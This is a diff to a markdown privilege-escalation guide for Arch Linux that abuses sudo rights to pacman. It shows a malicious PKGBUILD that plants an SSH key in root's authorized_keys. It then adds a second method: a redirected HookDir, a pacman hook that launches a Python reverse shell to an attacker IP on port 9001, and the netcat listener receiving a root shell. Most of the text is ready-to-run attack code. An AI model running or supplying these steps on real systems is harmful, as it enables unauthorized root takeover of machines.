@@ -26,6 +26,9 @@ If the user has sudo permission to run `pacman`, we can easily escalate privileg
 User skid may run the following commands on arch:    
  (ALL : ALL) NOPASSWD: /usr/bin/pacman
 ```
+## I
+
+### Required stuff
 
 First, create a directory and name it whatever you want:
 ```bash
@@ -51,6 +54,7 @@ package() {
 }
 ```
 
+### SSH Access
 Now, generate SSH keys on the target machine, and rename `id_rsa.pub` to `authorized_keys`:
 ```bash
 [skid@arch]$ ssh-keygen -t rsa -b 4096 -f id_rsa -N "" 
@@ -62,6 +66,7 @@ Now, generate SSH keys on the target machine, and rename `id_rsa.pub` to `author
 
 > This malicious package script is designed to add our public SSH key to root's authorized_keys.
 
+### Execute it
 Next, run `makepkg` in the directory containing the `PKGBUILD` script:
 ```bash
 [skid@arch priv]$ makepkg
@@ -78,6 +83,7 @@ The `makepkg` command should produce a `.zst` file, such as `privesc-1.0-1-any.p
 ```
 This will add your SSH key to the root user's authorized_keys, allowing root access via SSH.
 
+### Bash Script
 Just a bash script to do all the crap in snap.
 ```bash
 #!/bin/bash
@@ -115,4 +121,91 @@ echo "Malicious package created! Run the following command to deploy:"
 echo "sudo pacman -U $(pwd)/privesc-1.0-1-any.pkg.tar.zst"
 echo "Don't forget to secure your private key: id_rsa"
 
+```
+
+## II
+
+### Required stuff
+
+Make a copy of pacman:
+```bash
+[skid@arch] cp /etc/pacman.conf /dev/shm/pacman.conf
+```
+
+Edit it and update the `HookDir` under `[options]`
+```bash
+[skid@arch] nano /dev/shm/pacman.conf
+```
+Like this:
+```bash
+<SNIP>
+[options]
+# The following paths are commented out with their default values listed.
+# If you wish to use different paths, uncomment and update the paths.
+#RootDir     = /
+#DBPath      = /var/lib/pacman/
+#CacheDir    = /var/cache/pacman/pkg/
+#LogFile     = /var/log/pacman.log
+#GPGDir      = /etc/pacman.d/gnupg/
+HookDir     = /dev/shm/hooks/
+<SNIP>
+```
+> Uncomment `#HookDir`, make sure it's not commented out else you won't be shelling the arch skids.
+
+### test.hook
+Create a directory to hold hooks:
+```
+[skid@arch]$ mkdir /dev/shm/hooks 
+```
+Then create a `test.hook`:
+
+`test.hook`
+```bash
+[Trigger]
+Operation = Install
+Operation = Upgrade
+Operation = Remove
+Type = Package
+Target = *
+
+[Action]
+When = PreTransaction
+Exec = /bin/sh -c "python3 /dev/shm/shell.py IP 9001 &"
+```
+`shell.py`
+
+```py
+#!/usr/bin/env python
+import os
+import socket
+import sys
+import pty
+
+if os.fork() == 0:
+    cb = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    cb.connect((sys.argv[1], int(sys.argv[2])))
+
+    os.dup2(cb.fileno(), 0)
+    os.dup2(cb.fileno(), 1)
+    os.dup2(cb.fileno(), 2)
+
+    pty.spawn("/bin/sh")
+
+    cb.close()
+```
+### Executing it
+
+Now we have all what we need, let's remove a pkg. 
+I'll remove chromium.
+
+```bash
+[skid@arch]$ sudo /usr/bin/pacman --config /dev/shm/pacman.conf -R chromium
+```
+On the other hand, there is a shell:
+
+```
+[seadris@skid.com]➜ ~ nc -nvlp 9001
+listening on [any] 9001 ...
+connect to [10.10.14.x] from (UNKNOWN) [10.129.x.x] 50666
+sh-5.2#
 ```
